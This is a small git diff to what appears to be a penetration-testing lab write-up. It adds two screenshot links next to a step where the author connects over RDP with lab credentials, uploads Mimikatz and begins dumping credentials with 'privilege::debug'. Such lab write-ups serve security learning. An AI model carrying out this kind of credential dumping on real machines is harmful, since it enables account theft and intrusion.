@@ -384,6 +384,10 @@ xfreerdp3 /v:10.200.180.150 /u:elliot /p:elliot \
 
 Uploaded and executed Mimikatz to extract credentials:
 
+![rdp-no2](/assets/images/wreath-images/rdp 2.png)
+
+![rdp-no3](/assets/images/wreath-images/rdp 3.png)
+
 ```
 mimikatz # privilege::debug
 Privilege '20' OK
